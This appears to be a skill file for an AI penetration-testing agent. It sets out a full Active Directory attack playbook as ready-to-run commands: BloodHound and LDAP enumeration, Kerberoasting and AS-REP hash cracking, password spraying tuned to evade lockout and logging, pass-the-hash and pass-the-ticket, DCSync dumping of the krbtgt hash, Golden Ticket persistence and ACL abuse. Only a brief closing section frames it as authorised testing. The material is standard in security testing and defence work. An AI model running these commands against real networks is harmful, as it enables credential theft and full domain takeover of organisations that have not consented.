---
name: active_directory
description: Active Directory attacks - Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash/Ticket, BloodHound enumeration, Golden/Silver Ticket
---

# Active Directory Attacks

Active Directory attacks exploit Kerberos authentication, LDAP, SMB, and privileged service accounts to escalate from a domain foothold to Domain Admin. Start with enumeration, pivot to credential extraction, then move toward DCSync or Golden Ticket for full domain compromise.

## Phase 1: Enumeration

### BloodHound / SharpHound

```bash
# From Linux with valid domain credentials
bloodhound-python -u 'user@domain.local' -p 'Password1' -d domain.local \
  -ns 192.168.1.1 --disable-autoresolution -c All

# SharpHound from Windows
.\SharpHound.exe -c All --zipfilename output.zip

# Import into BloodHound UI → run queries:
# - "Find Shortest Paths to Domain Admins"
# - "Find All Domain Admins"
# - "Computers Where Domain Users are Local Admin"
# - "Find Principals with DCSync Rights"
```

### LDAP Enumeration

```bash
# Enumerate users
ldapsearch -x -H ldap://DC_IP -D 'domain\user' -w 'Password1' \
  -b 'DC=domain,DC=local' '(objectClass=person)' sAMAccountName memberOf

# Find accounts with SPN set (Kerberoasting candidates)
ldapsearch -x -H ldap://DC_IP -D 'domain\user' -w 'Password1' \
  -b 'DC=domain,DC=local' '(servicePrincipalName=*)' sAMAccountName

# Find accounts with "Do not require Kerberos preauthentication" (AS-REP)
ldapsearch -x -H ldap://DC_IP -D 'domain\user' -w 'Password1' \
  -b 'DC=domain,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
```

## Phase 2: Credential Attacks

### Kerberoasting

Request TGS for SPN accounts → crack offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:Password1 -dc-ip 192.168.1.1 -request \
  -outputfile kerberoast_hashes.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# From Windows
.\Rubeus.exe kerberoast /output:kerberoast.txt
```

### AS-REP Roasting

No pre-auth required → request AS-REP without knowing password:

```bash
# Enumerate first
GetNPUsers.py domain.local/ -dc-ip 192.168.1.1 \
  -usersfile /tmp/users.txt -format hashcat -outputfile asrep.txt

# With credentials to find all such accounts:
GetNPUsers.py domain.local/user:Password1 -dc-ip 192.168.1.1 -request -format hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying (No Lockout)

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Autumn2024!' --continue-on-success

# kerbrute (Kerberos-based, avoids LDAP logging)
kerbrute passwordspray --domain domain.local --dc 192.168.1.1 \
  users.txt 'Autumn2024!'
# Note: observe lockout threshold — spray at 1 attempt per user per hour
```

## Phase 3: Lateral Movement

### Pass-the-Hash

```bash
# wmiexec/smbexec with NTLM hash
wmiexec.py -hashes :NTLM_HASH domain/Administrator@TARGET_IP

# From Windows:
mimikatz# sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket

```bash
# Export tickets (mimikatz)
mimikatz# sekurlsa::tickets /export

# Import ticket (Linux)
export KRB5CCNAME=/tmp/ticket.ccache
wmiexec.py -k -no-pass domain.local/user@TARGET_IP
```

### Overpass-the-Hash (NTLM → Kerberos TGT)

```
mimikatz# sekurlsa::pth /user:svc_account /domain:domain.local /ntlm:HASH /run:klist
# Now use Kerberos-authenticated tools
```

## Phase 4: Privilege Escalation to Domain Admin

### DCSync (Requires Domain Replication Rights)

```bash
# Dump NTDS.dit credentials without touching DC filesystem
secretsdump.py -just-dc domain.local/DA_user:Password@DC_IP

# Or with hash
secretsdump.py -just-dc-user krbtgt domain.local/DA_user@DC_IP \
  -hashes :DA_NTLM_HASH

# Mimikatz
mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
```

### Golden Ticket (Post-DCSync)

```bash
# Requires: krbtgt NTLM hash, domain SID
mimikatz# kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Golden ticket = full domain persistence — valid 10 years by default
```

### ACL-Based Privilege Escalation

```bash
# If user has GenericWrite over a user → force password reset
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# If user has GenericWrite over a computer → add delegation / RBCD attack
Set-DomainObject -Identity PC$ -Set @{msDS-AllowedToActOnBehalfOfOtherIdentity=...}

# BloodHound shows these paths: look for "CanRDP", "GenericAll", "WriteOwner", "WriteDACL"
```

## Key Impacket Commands Reference

```bash
# List SMB shares
smbclient.py domain.local/user:Password1@TARGET_IP

# Execute command via WMI
wmiexec.py domain.local/Administrator:Password@TARGET_IP "whoami"

# Dump local SAM
secretsdump.py domain.local/Administrator:Password@TARGET_IP

# Request TGT
getTGT.py domain.local/user:Password1 -dc-ip DC_IP

# Enumerate delegations
findDelegation.py domain.local/user:Password1 -dc-ip DC_IP
```

## Validation Approach

1. Start BloodHound collection → identify shortest path to DA
2. Kerberoast → attempt offline crack → if successful = DA escalation path
3. Document each privilege escalation step separately with command + output
4. For DCSync: show krbtgt hash dump as impact evidence
5. Golden ticket: show access to all DCs with crafted ticket
6. Never actually modify production objects — read-only evidence only

## Tools

- `impacket` — comprehensive AD attack suite
- `BloodHound` + `SharpHound/bloodhound-python` — attack path mapping
- `CrackMapExec` / `NetExec` — SMB/WinRM execution
- `Rubeus` — Kerberos attacks from Windows
- `Mimikatz` — credential extraction from memory
- `Hashcat` — offline hash cracking
